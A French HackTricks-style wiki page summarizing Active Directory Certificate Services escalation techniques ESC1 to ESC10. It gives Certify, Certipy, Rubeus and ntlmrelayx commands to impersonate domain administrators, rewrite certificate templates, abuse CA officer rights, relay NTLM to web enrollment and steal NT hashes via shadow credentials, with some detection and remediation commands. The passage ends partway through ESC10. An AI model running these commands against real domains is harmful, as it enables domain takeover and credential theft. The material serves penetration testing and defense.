# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}

**Ceci est un résumé des sections de techniques d'escalade des publications :**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modèles de certificats mal configurés - ESC1

### Explication

### Modèles de certificats mal configurés - ESC1 Expliqué

- **Les droits d'inscription sont accordés à des utilisateurs à faibles privilèges par l'Enterprise CA.**
- **L'approbation du manager n'est pas requise.**
- **Aucune signature de personnel autorisé n'est nécessaire.**
- **Les descripteurs de sécurité sur les modèles de certificats sont trop permissifs, permettant aux utilisateurs à faibles privilèges d'obtenir des droits d'inscription.**
- **Les modèles de certificats sont configurés pour définir des EKU qui facilitent l'authentification :**
- Des identifiants d'Extended Key Usage (EKU) tels que Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), ou pas d'EKU (SubCA) sont inclus.
- **La possibilité pour les demandeurs d'inclure un subjectAltName dans la Certificate Signing Request (CSR) est autorisée par le modèle :**
- Active Directory (AD) priorise le subjectAltName (SAN) dans un certificat pour la vérification d'identité s'il est présent. Cela signifie qu'en spécifiant le SAN dans une CSR, un certificat peut être demandé pour usurper l'identité de n'importe quel utilisateur (par exemple, un administrateur de domaine). La possibilité de spécifier un SAN par le demandeur est indiquée dans l'objet AD du modèle de certificat par la propriété `mspki-certificate-name-flag`. Cette propriété est un masque de bits, et la présence du drapeau `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permet la spécification du SAN par le demandeur.

> [!CAUTION]
> La configuration décrite permet aux utilisateurs à faibles privilèges de demander des certificats avec n'importe quel SAN de leur choix, permettant l'authentification en tant que n'importe quel principal de domaine via Kerberos ou SChannel.

Cette fonctionnalité est parfois activée pour soutenir la génération à la volée de certificats HTTPS ou d'hôtes par des produits ou des services de déploiement, ou en raison d'un manque de compréhension.

Il est noté que la création d'un certificat avec cette option déclenche un avertissement, ce qui n'est pas le cas lorsqu'un modèle de certificat existant (tel que le modèle `WebServer`, qui a `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé) est dupliqué puis modifié pour inclure un OID d'authentification.

### Abus

Pour **trouver des modèles de certificats vulnérables**, vous pouvez exécuter :
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Pour **exploiter cette vulnérabilité pour usurper l'identité d'un administrateur**, on pourrait exécuter :
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Ensuite, vous pouvez transformer le **certificat généré au format `.pfx`** et l'utiliser pour **vous authentifier en utilisant Rubeus ou certipy** à nouveau :
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Les binaires Windows "Certreq.exe" et "Certutil.exe" peuvent être utilisés pour générer le PFX : https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L'énumération des modèles de certificats dans le schéma de configuration de la forêt AD, en particulier ceux ne nécessitant pas d'approbation ou de signatures, possédant un EKU d'authentification client ou de connexion par carte intelligente, et avec le drapeau `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé, peut être effectuée en exécutant la requête LDAP suivante :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modèles de certificats mal configurés - ESC2

### Explication

Le deuxième scénario d'abus est une variation du premier :

1. Les droits d'inscription sont accordés à des utilisateurs à faibles privilèges par l'Enterprise CA.
2. L'exigence d'approbation du manager est désactivée.
3. La nécessité de signatures autorisées est omise.
4. Un descripteur de sécurité trop permissif sur le modèle de certificat accorde des droits d'inscription de certificat à des utilisateurs à faibles privilèges.
5. **Le modèle de certificat est défini pour inclure l'EKU Any Purpose ou aucune EKU.**

L'**EKU Any Purpose** permet à un attaquant d'obtenir un certificat pour **n'importe quel but**, y compris l'authentification client, l'authentification serveur, la signature de code, etc. La même **technique utilisée pour ESC3** peut être employée pour exploiter ce scénario.

Les certificats avec **aucune EKU**, qui agissent comme des certificats CA subordonnés, peuvent être exploités pour **n'importe quel but** et peuvent **également être utilisés pour signer de nouveaux certificats**. Ainsi, un attaquant pourrait spécifier des EKU ou des champs arbitraires dans les nouveaux certificats en utilisant un certificat CA subordonné.

Cependant, les nouveaux certificats créés pour **l'authentification de domaine** ne fonctionneront pas si la CA subordonnée n'est pas approuvée par l'objet **`NTAuthCertificates`**, qui est le paramètre par défaut. Néanmoins, un attaquant peut toujours créer **de nouveaux certificats avec n'importe quelle EKU** et des valeurs de certificat arbitraires. Ceux-ci pourraient potentiellement être **abusés** pour un large éventail de buts (par exemple, signature de code, authentification serveur, etc.) et pourraient avoir des implications significatives pour d'autres applications dans le réseau comme SAML, AD FS ou IPSec.

Pour énumérer les modèles qui correspondent à ce scénario dans le schéma de configuration de la forêt AD, la requête LDAP suivante peut être exécutée :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modèles d'Agent d'Inscription Mal Configurés - ESC3

### Explication

Ce scénario est similaire au premier et au deuxième, mais **abuse** d'un **EKU** (Agent de Demande de Certificat) **différent** et de **2 modèles différents** (il a donc 2 ensembles d'exigences),

L'**EKU d'Agent de Demande de Certificat** (OID 1.3.6.1.4.1.311.20.2.1), connu sous le nom d'**Agent d'Inscription** dans la documentation Microsoft, permet à un principal de **s'inscrire** pour un **certificat** **au nom d'un autre utilisateur**.

L'**“agent d'inscription”** s'inscrit dans un **modèle** et utilise le **certificat résultant pour co-signer un CSR au nom de l'autre utilisateur**. Il **envoie** ensuite le **CSR co-signé** à la CA, s'inscrivant dans un **modèle** qui **permet “l'inscription au nom de”**, et la CA répond avec un **certificat appartenant à l'“autre” utilisateur**.

**Exigences 1 :**

- Les droits d'inscription sont accordés aux utilisateurs à faibles privilèges par la CA d'Entreprise.
- L'exigence d'approbation du manager est omise.
- Aucune exigence de signatures autorisées.
- Le descripteur de sécurité du modèle de certificat est excessivement permissif, accordant des droits d'inscription aux utilisateurs à faibles privilèges.
- Le modèle de certificat inclut l'EKU d'Agent de Demande de Certificat, permettant la demande d'autres modèles de certificats au nom d'autres principaux.

**Exigences 2 :**

- La CA d'Entreprise accorde des droits d'inscription aux utilisateurs à faibles privilèges.
- L'approbation du manager est contournée.
- La version du schéma du modèle est soit 1, soit supérieure à 2, et elle spécifie une Exigence de Politique d'Application qui nécessite l'EKU d'Agent de Demande de Certificat.
- Un EKU défini dans le modèle de certificat permet l'authentification de domaine.
- Aucune restriction pour les agents d'inscription n'est appliquée sur la CA.

### Abus

Vous pouvez utiliser [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) pour abuser de ce scénario :
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Les **utilisateurs** qui sont autorisés à **obtenir** un **certificat d'agent d'inscription**, les modèles dans lesquels les **agents** d'inscription sont autorisés à s'inscrire, et les **comptes** au nom desquels l'agent d'inscription peut agir peuvent être contraints par des CAs d'entreprise. Cela se fait en ouvrant le `certsrc.msc` **snap-in**, en **cliquant avec le bouton droit sur le CA**, en **cliquant sur Propriétés**, puis en **naviguant** vers l'onglet “Agents d'inscription”.

Cependant, il est noté que le paramètre **par défaut** pour les CAs est de “**Ne pas restreindre les agents d'inscription**.” Lorsque la restriction sur les agents d'inscription est activée par les administrateurs, en la définissant sur “Restreindre les agents d'inscription”, la configuration par défaut reste extrêmement permissive. Elle permet à **Tout le monde** d'accéder à l'inscription dans tous les modèles en tant que n'importe qui.

## Contrôle d'accès au modèle de certificat vulnérable - ESC4

### **Explication**

Le **descripteur de sécurité** sur les **modèles de certificat** définit les **permissions** spécifiques que les **principaux AD** possèdent concernant le modèle.

Si un **attaquant** possède les **permissions** requises pour **modifier** un **modèle** et **instituer** des **mauvais configurations exploitables** décrites dans les **sections précédentes**, une élévation de privilèges pourrait être facilitée.

Les permissions notables applicables aux modèles de certificat incluent :

- **Propriétaire :** Accorde un contrôle implicite sur l'objet, permettant la modification de n'importe quel attribut.
- **FullControl :** Permet une autorité complète sur l'objet, y compris la capacité de modifier n'importe quel attribut.
- **WriteOwner :** Permet la modification du propriétaire de l'objet à un principal sous le contrôle de l'attaquant.
- **WriteDacl :** Permet l'ajustement des contrôles d'accès, pouvant potentiellement accorder à un attaquant FullControl.
- **WriteProperty :** Autorise l'édition de n'importe quelles propriétés de l'objet.

### Abus

Un exemple de privesc comme le précédent :

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 est lorsque un utilisateur a des privilèges d'écriture sur un modèle de certificat. Cela peut par exemple être abusé pour écraser la configuration du modèle de certificat afin de rendre le modèle vulnérable à ESC1.

Comme nous pouvons le voir dans le chemin ci-dessus, seul `JOHNPC` a ces privilèges, mais notre utilisateur `JOHN` a le nouveau lien `AddKeyCredentialLink` vers `JOHNPC`. Puisque cette technique est liée aux certificats, j'ai également mis en œuvre cette attaque, qui est connue sous le nom de [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Voici un petit aperçu de la commande `shadow auto` de Certipy pour récupérer le hachage NT de la victime.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** peut écraser la configuration d'un modèle de certificat avec une seule commande. Par **défaut**, Certipy **écrasera** la configuration pour la rendre **vulnérable à ESC1**. Nous pouvons également spécifier le **paramètre `-save-old` pour sauvegarder l'ancienne configuration**, ce qui sera utile pour **restaurer** la configuration après notre attaque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Contrôle d'accès des objets PKI vulnérables - ESC5

### Explication

Le vaste réseau de relations interconnectées basées sur les ACL, qui inclut plusieurs objets au-delà des modèles de certificats et de l'autorité de certification, peut impacter la sécurité de l'ensemble du système AD CS. Ces objets, qui peuvent affecter significativement la sécurité, comprennent :

- L'objet ordinateur AD du serveur CA, qui peut être compromis par des mécanismes comme S4U2Self ou S4U2Proxy.
- Le serveur RPC/DCOM du serveur CA.
- Tout objet ou conteneur AD descendant dans le chemin de conteneur spécifique `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ce chemin inclut, mais n'est pas limité à, des conteneurs et objets tels que le conteneur des modèles de certificats, le conteneur des autorités de certification, l'objet NTAuthCertificates, et le conteneur des services d'inscription.

La sécurité du système PKI peut être compromise si un attaquant à faible privilège parvient à prendre le contrôle de l'un de ces composants critiques.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explication

Le sujet discuté dans le [**post de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) aborde également les implications du drapeau **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, comme l'a décrit Microsoft. Cette configuration, lorsqu'elle est activée sur une Autorité de Certification (CA), permet l'inclusion de **valeurs définies par l'utilisateur** dans le **nom alternatif du sujet** pour **toute demande**, y compris celles construites à partir d'Active Directory®. Par conséquent, cette disposition permet à un **intrus** de s'inscrire via **n'importe quel modèle** configuré pour l'**authentification** de domaine—spécifiquement ceux ouverts à l'inscription d'utilisateurs **non privilégiés**, comme le modèle d'utilisateur standard. En conséquence, un certificat peut être sécurisé, permettant à l'intrus de s'authentifier en tant qu'administrateur de domaine ou **tout autre entité active** au sein du domaine.

**Remarque** : L'approche pour ajouter des **noms alternatifs** dans une Demande de Signature de Certificat (CSR), via l'argument `-attrib "SAN:"` dans `certreq.exe` (appelé “Paires Nom Valeur”), présente un **contraste** avec la stratégie d'exploitation des SAN dans ESC1. Ici, la distinction réside dans **la manière dont les informations de compte sont encapsulées**—dans un attribut de certificat, plutôt que dans une extension.

### Abus

Pour vérifier si le paramètre est activé, les organisations peuvent utiliser la commande suivante avec `certutil.exe` :
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Cette opération utilise essentiellement **l'accès au registre à distance**, donc une approche alternative pourrait être :
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Des outils comme [**Certify**](https://github.com/GhostPack/Certify) et [**Certipy**](https://github.com/ly4k/Certipy) sont capables de détecter cette mauvaise configuration et de l'exploiter :
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Pour modifier ces paramètres, en supposant que l'on possède des droits **d'administrateur de domaine** ou équivalents, la commande suivante peut être exécutée depuis n'importe quelle station de travail :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Pour désactiver cette configuration dans votre environnement, le drapeau peut être supprimé avec :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Après les mises à jour de sécurité de mai 2022, les **certificats** nouvellement émis contiendront une **extension de sécurité** qui incorpore la propriété `objectSid` du **demandeur**. Pour ESC1, ce SID est dérivé du SAN spécifié. Cependant, pour **ESC6**, le SID reflète le **`objectSid` du demandeur**, et non le SAN.\
> Pour exploiter ESC6, il est essentiel que le système soit susceptible à ESC10 (Mappages de certificats faibles), qui privilégie le **SAN par rapport à la nouvelle extension de sécurité**.

## Contrôle d'accès de l'autorité de certification vulnérable - ESC7

### Attaque 1

#### Explication

Le contrôle d'accès pour une autorité de certification est maintenu par un ensemble de permissions qui régissent les actions de la CA. Ces permissions peuvent être consultées en accédant à `certsrv.msc`, en cliquant avec le bouton droit sur une CA, en sélectionnant les propriétés, puis en naviguant vers l'onglet Sécurité. De plus, les permissions peuvent être énumérées en utilisant le module PSPKI avec des commandes telles que :
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Cela fournit des informations sur les droits principaux, à savoir **`ManageCA`** et **`ManageCertificates`**, correspondant respectivement aux rôles d'« administrateur CA » et de « gestionnaire de certificats ».

#### Abus

Avoir des droits **`ManageCA`** sur une autorité de certification permet au principal de manipuler les paramètres à distance en utilisant PSPKI. Cela inclut l'activation du drapeau **`EDITF_ATTRIBUTESUBJECTALTNAME2`** pour permettre la spécification de SAN dans n'importe quel modèle, un aspect critique de l'escalade de domaine.

La simplification de ce processus est réalisable grâce à l'utilisation de la cmdlet **Enable-PolicyModuleFlag** de PSPKI, permettant des modifications sans interaction directe avec l'interface graphique.

La possession de droits **`ManageCertificates`** facilite l'approbation des demandes en attente, contournant efficacement la protection « approbation du gestionnaire de certificats CA ».

Une combinaison des modules **Certify** et **PSPKI** peut être utilisée pour demander, approuver et télécharger un certificat :
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attaque 2

#### Explication

> [!WARNING]
> Dans la **précédente attaque**, les permissions **`Manage CA`** ont été utilisées pour **activer** le drapeau **EDITF_ATTRIBUTESUBJECTALTNAME2** afin d'effectuer l'**attaque ESC6**, mais cela n'aura aucun effet jusqu'à ce que le service CA (`CertSvc`) soit redémarré. Lorsqu'un utilisateur a le droit d'accès **`Manage CA`**, l'utilisateur est également autorisé à **redémarrer le service**. Cependant, cela **ne signifie pas que l'utilisateur peut redémarrer le service à distance**. De plus, l'**ESC6 pourrait ne pas fonctionner immédiatement** dans la plupart des environnements corrigés en raison des mises à jour de sécurité de mai 2022.

Par conséquent, une autre attaque est présentée ici.

Prérequis :

- Seulement la permission **`ManageCA`**
- Permission **`Manage Certificates`** (peut être accordée depuis **`ManageCA`**)
- Le modèle de certificat **`SubCA`** doit être **activé** (peut être activé depuis **`ManageCA`**)

La technique repose sur le fait que les utilisateurs ayant le droit d'accès **`Manage CA`** _et_ **`Manage Certificates`** peuvent **émettre des demandes de certificats échouées**. Le modèle de certificat **`SubCA`** est **vulnérable à l'ESC1**, mais **seuls les administrateurs** peuvent s'inscrire dans le modèle. Ainsi, un **utilisateur** peut **demander** à s'inscrire dans le **`SubCA`** - ce qui sera **refusé** - mais **ensuite émis par le responsable par la suite**.

#### Abus

Vous pouvez **vous accorder le droit d'accès `Manage Certificates`** en ajoutant votre utilisateur en tant que nouvel officier.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Le modèle **`SubCA`** peut être **activé sur la CA** avec le paramètre `-enable-template`. Par défaut, le modèle `SubCA` est activé.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si nous avons rempli les prérequis pour cette attaque, nous pouvons commencer par **demander un certificat basé sur le modèle `SubCA`**.

**Cette demande sera refusée**, mais nous allons sauvegarder la clé privée et noter l'ID de la demande.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Avec nos **`Manage CA` et `Manage Certificates`**, nous pouvons ensuite **émettre la demande de certificat échouée** avec la commande `ca` et le paramètre `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Et enfin, nous pouvons **récupérer le certificat émis** avec la commande `req` et le paramètre `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay vers les points de terminaison HTTP AD CS – ESC8

### Explication

> [!NOTE]
> Dans les environnements où **AD CS est installé**, si un **point de terminaison d'inscription web vulnérable** existe et qu'au moins un **modèle de certificat est publié** qui permet **l'inscription des ordinateurs de domaine et l'authentification des clients** (comme le modèle par défaut **`Machine`**), il devient possible pour **tout ordinateur avec le service spooler actif d'être compromis par un attaquant** !

Plusieurs **méthodes d'inscription basées sur HTTP** sont prises en charge par AD CS, mises à disposition par des rôles de serveur supplémentaires que les administrateurs peuvent installer. Ces interfaces pour l'inscription de certificats basée sur HTTP sont susceptibles aux **attaques de relais NTLM**. Un attaquant, depuis une **machine compromise, peut usurper n'importe quel compte AD qui s'authentifie via NTLM entrant**. En usurpant le compte de la victime, ces interfaces web peuvent être accessibles par un attaquant pour **demander un certificat d'authentification client en utilisant les modèles de certificat `User` ou `Machine`**.

- L'**interface d'inscription web** (une ancienne application ASP disponible à `http://<caserver>/certsrv/`), par défaut, ne propose que HTTP, ce qui n'offre pas de protection contre les attaques de relais NTLM. De plus, elle permet explicitement uniquement l'authentification NTLM via son en-tête HTTP d'autorisation, rendant des méthodes d'authentification plus sécurisées comme Kerberos inapplicables.
- Le **Service d'inscription de certificats** (CES), le **Service Web de politique d'inscription de certificats** (CEP) et le **Service d'inscription des dispositifs réseau** (NDES) prennent par défaut en charge l'authentification négociée via leur en-tête HTTP d'autorisation. L'authentification négociée **prend en charge à la fois** Kerberos et **NTLM**, permettant à un attaquant de **rétrograder à l'authentification NTLM** lors des attaques de relais. Bien que ces services web activent HTTPS par défaut, HTTPS seul **ne protège pas contre les attaques de relais NTLM**. La protection contre les attaques de relais NTLM pour les services HTTPS n'est possible que lorsque HTTPS est combiné avec le binding de canal. Malheureusement, AD CS n'active pas la Protection étendue pour l'authentification sur IIS, ce qui est requis pour le binding de canal.

Un problème courant avec les attaques de relais NTLM est la **courte durée des sessions NTLM** et l'incapacité de l'attaquant à interagir avec des services qui **exigent la signature NTLM**.

Néanmoins, cette limitation est surmontée en exploitant une attaque de relais NTLM pour acquérir un certificat pour l'utilisateur, car la période de validité du certificat dicte la durée de la session, et le certificat peut être utilisé avec des services qui **mandatent la signature NTLM**. Pour des instructions sur l'utilisation d'un certificat volé, référez-vous à :

{{#ref}}
account-persistence.md
{{#endref}}

Une autre limitation des attaques de relais NTLM est que **une machine contrôlée par un attaquant doit être authentifiée par un compte victime**. L'attaquant pourrait soit attendre, soit tenter de **forcer** cette authentification :

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abus**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` énumère les **points de terminaison HTTP AD CS activés** :
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La propriété `msPKI-Enrollment-Servers` est utilisée par les autorités de certification (CA) d'entreprise pour stocker les points de terminaison du service d'inscription de certificats (CES). Ces points de terminaison peuvent être analysés et listés en utilisant l'outil **Certutil.exe** :
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abus avec Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abus avec [Certipy](https://github.com/ly4k/Certipy)

La demande de certificat est faite par Certipy par défaut en fonction du modèle `Machine` ou `User`, déterminé par le fait que le nom du compte relayé se termine par `$`. La spécification d'un modèle alternatif peut être réalisée grâce à l'utilisation du paramètre `-template`.

Une technique comme [PetitPotam](https://github.com/ly4k/PetitPotam) peut ensuite être utilisée pour contraindre l'authentification. Lorsqu'il s'agit de contrôleurs de domaine, la spécification de `-template DomainController` est requise.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explication

La nouvelle valeur **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) pour **`msPKI-Enrollment-Flag`**, appelée ESC9, empêche l'intégration de la **nouvelle extension de sécurité `szOID_NTDS_CA_SECURITY_EXT`** dans un certificat. Ce drapeau devient pertinent lorsque `StrongCertificateBindingEnforcement` est réglé sur `1` (le paramètre par défaut), ce qui contraste avec un réglage de `2`. Sa pertinence est accrue dans des scénarios où un mappage de certificat plus faible pour Kerberos ou Schannel pourrait être exploité (comme dans ESC10), étant donné que l'absence d'ESC9 ne modifierait pas les exigences.

Les conditions sous lesquelles le réglage de ce drapeau devient significatif incluent :

- `StrongCertificateBindingEnforcement` n'est pas ajusté à `2` (le paramètre par défaut étant `1`), ou `CertificateMappingMethods` inclut le drapeau `UPN`.
- Le certificat est marqué avec le drapeau `CT_FLAG_NO_SECURITY_EXTENSION` dans le réglage `msPKI-Enrollment-Flag`.
- Toute authentification client EKU est spécifiée par le certificat.
- Les permissions `GenericWrite` sont disponibles sur n'importe quel compte pour compromettre un autre.

### Scénario d'abus

Supposons que `John@corp.local` détienne des permissions `GenericWrite` sur `Jane@corp.local`, avec l'objectif de compromettre `Administrator@corp.local`. Le modèle de certificat `ESC9`, auquel `Jane@corp.local` est autorisée à s'inscrire, est configuré avec le drapeau `CT_FLAG_NO_SECURITY_EXTENSION` dans son réglage `msPKI-Enrollment-Flag`.

Au départ, le hachage de `Jane` est acquis en utilisant des Shadow Credentials, grâce à `GenericWrite` de `John` :
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Ensuite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, omettant délibérément la partie de domaine `@corp.local` :
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Cette modification ne viole pas les contraintes, étant donné que `Administrator@corp.local` reste distinct en tant que `userPrincipalName` de `Administrator`.

Suite à cela, le modèle de certificat `ESC9`, marqué comme vulnérable, est demandé en tant que `Jane` :
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Il est noté que le `userPrincipalName` du certificat reflète `Administrator`, dépourvu de tout “object SID”.

Le `userPrincipalName` de `Jane` est ensuite rétabli à son original, `Jane@corp.local` :
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Tenter l'authentification avec le certificat émis donne maintenant le hachage NT de `Administrator@corp.local`. La commande doit inclure `-domain <domain>` en raison de l'absence de spécification de domaine dans le certificat :
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mappages de certificats faibles - ESC10

### Explication

Deux valeurs de clé de registre sur le contrôleur de domaine sont référencées par ESC10 :

- La valeur par défaut pour `CertificateMappingMethods` sous `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` est `0x18` (`0x8 | 0x10`), précédemment définie à `0x1F`.
- Le paramètre par défaut pour `StrongCertificateBindingEnforcement` sous `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` est `1`, précédemment `0`.

**Cas 1**

Lorsque `StrongCertificateBindingEnforcement` est configuré à `0`.

**Cas 2**

Si `CertificateMappingMethods` inclut le bit `UPN` (`0x4`).

### Cas d'abus 1

Avec `StrongCertificateBindingEnforcement` configuré à `0`, un compte A avec des permissions `GenericWrite` peut être exploité pour compromettre n'importe quel compte B.

Par exemple, ayant des permissions `GenericWrite` sur `Jane@corp.local`, un attaquant vise à compromettre `Administrator@corp.local`. La procédure reflète ESC9, permettant d'utiliser n'importe quel modèle de certificat.

